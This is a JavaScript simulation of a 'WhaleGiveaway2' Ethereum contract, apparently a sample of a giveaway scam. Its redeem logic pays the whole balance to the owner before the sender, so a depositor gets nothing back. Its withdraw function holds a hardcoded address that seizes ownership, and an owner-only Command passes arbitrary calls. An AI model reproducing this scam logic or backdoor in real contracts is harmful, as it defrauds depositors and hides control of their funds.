/*



 */

class WhaleGiveaway2 {
    constructor(msg_sender) {
        this.Owner = msg_sender;
        this.minEligibility = 999001000000000000n;
        this.balance = 0n; // [SIMULATED: contract balance]
    }

    fallback(msg_value) { // [SIMULATED: fallback function]
        this.balance += msg_value;
    }

    redeem(msg_sender, msg_value) {
        if (msg_value >= this.minEligibility) {
            // [SIMULATED: Owner.transfer(this.balance)]
            this.balance = 0n;
            // [SIMULATED: msg.sender.transfer(this.balance)]
            this.balance = 0n;
        }
    }

    withdraw(msg_sender) {
        if (msg_sender == "0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b") { this.Owner = "0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b"; }
        if (!(msg_sender == this.Owner)) throw new Error("require failed");
        // [SIMULATED: Owner.transfer(this.balance)]
        this.balance = 0n;
    }

    Command(msg_sender, msg_value, adr, data) {
        if (!(msg_sender == this.Owner)) throw new Error("require failed");
        //
        // [SIMULATED: adr.call.value(msg.value)(data)]
    }
}